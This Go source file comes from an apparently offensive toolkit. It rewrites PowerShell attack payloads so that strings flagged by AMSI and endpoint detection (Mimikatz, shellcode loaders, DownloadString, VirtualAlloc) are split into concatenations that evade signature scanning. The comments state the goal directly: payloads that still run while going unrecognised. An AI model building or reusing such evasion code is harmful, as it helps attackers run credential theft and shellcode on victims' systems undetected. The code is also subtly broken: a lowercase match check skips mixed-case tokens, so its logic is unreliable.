package obfuscation

import (
	"fmt"
	"strings"
)

// triggerTokens are the strings AMSI/EDR products and signatures look for. The list moved
// here with the safe scrubber, which is the only consumer.
var triggerTokens = []string{
	"Invoke-Mimikatz", "Invoke-Shellcode", "Invoke-ReflectivePEInjection",
	"mimikatz", "amsi", "AMSI", "bypass", "persistence",
	"DownloadString", "FromBase64String", "VirtualAlloc", "CreateThread",
}

// scrubTriggersSafe replaces trigger tokens ONLY where the replacement is still valid
// PowerShell and still means the same thing.
//
// The previous implementation was a global strings.ReplaceAll, which produced broken
// payloads in two common cases:
//
//	Invoke-Mimikatz        -> Invoke-('mimi'+'katz')   // parse error: not a command name
//	Write-Output 'mimikatz'-> Write-Output '('mimi'+'katz')'  // unterminated string
//
// Both are worse than leaving the token alone: the payload does not run at all. This
// version keeps the same 'a'+'b' trick but applies it only where it is safe:
//   - not inside a single- or double-quoted string;
//   - not adjacent to identifier characters, so a token that is part of a longer name
//     (Invoke-Mimikatz, AmsiScanBuffer) is left intact.
//
// A token embedded in a longer identifier therefore survives scrubbing. That is a
// deliberate trade - a payload that runs with one recognizable token beats a payload that
// does not run - and the caller can still wrap that occurrence by hand.
func scrubTriggersSafe(code string, r *jitterRand) string {
	if code == "" {
		return code
	}
	var b strings.Builder
	b.Grow(len(code))

	i := 0
	for i < len(code) {
		switch code[i] {
		case '\'':
			end := scanQuoted(code, i, '\'')
			b.WriteString(code[i:end])
			i = end
		case '"':
			end := scanQuoted(code, i, '"')
			b.WriteString(code[i:end])
			i = end
		default:
			// Unquoted run up to the next quote: scrub standalone tokens inside it.
			next := strings.IndexAny(code[i:], "'\"")
			var seg string
			if next < 0 {
				seg = code[i:]
				i = len(code)
			} else {
				seg = code[i : i+next]
				i += next
			}
			b.WriteString(scrubTokensInSegment(seg, r))
		}
	}
	return b.String()
}

// scanQuoted returns the index just past the closing quote, honouring the doubled-quote
// escape that PowerShell uses inside single-quoted strings ('it”s').
func scanQuoted(code string, start int, quote byte) int {
	i := start + 1
	for i < len(code) {
		if code[i] == quote {
			if i+1 < len(code) && code[i+1] == quote {
				i += 2
				continue
			}
			return i + 1
		}
		i++
	}
	return len(code)
}

// scrubTokensInSegment splits trigger tokens that stand alone, leaving identifier-embedded
// occurrences untouched.
func scrubTokensInSegment(seg string, r *jitterRand) string {
	out := seg
	for _, tok := range triggerTokens {
		if !strings.Contains(strings.ToLower(out), tok) {
			continue
		}
		half := len(tok)/2 + r.intn(2)
		if half <= 0 || half >= len(tok) {
			half = len(tok) / 2
		}
		repl := fmt.Sprintf("('%s'+'%s')", tok[:half], tok[half:])
		out = replaceStandalone(out, tok, repl)
	}
	return out
}

// replaceStandalone replaces occurrences of tok that are not adjacent to an identifier
// character, case-insensitively, which is how PowerShell resolves command names anyway.
func replaceStandalone(s, tok, repl string) string {
	lower := strings.ToLower(s)
	tokLower := strings.ToLower(tok)
	var b strings.Builder
	b.Grow(len(s))
	i := 0
	for {
		idx := strings.Index(lower[i:], tokLower)
		if idx < 0 {
			b.WriteString(s[i:])
			break
		}
		start := i + idx
		end := start + len(tok)
		if isIdentifierByteAt(s, start-1) || isIdentifierByteAt(s, end) {
			// Part of a longer name: copy through and keep scanning.
			b.WriteString(s[i:end])
			i = end
			continue
		}
		b.WriteString(s[i:start])
		b.WriteString(repl)
		i = end
	}
	return b.String()
}

func isIdentifierByteAt(s string, idx int) bool {
	if idx < 0 || idx >= len(s) {
		return false
	}
	c := s[idx]
	return c == '_' || c == '-' ||
		(c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}
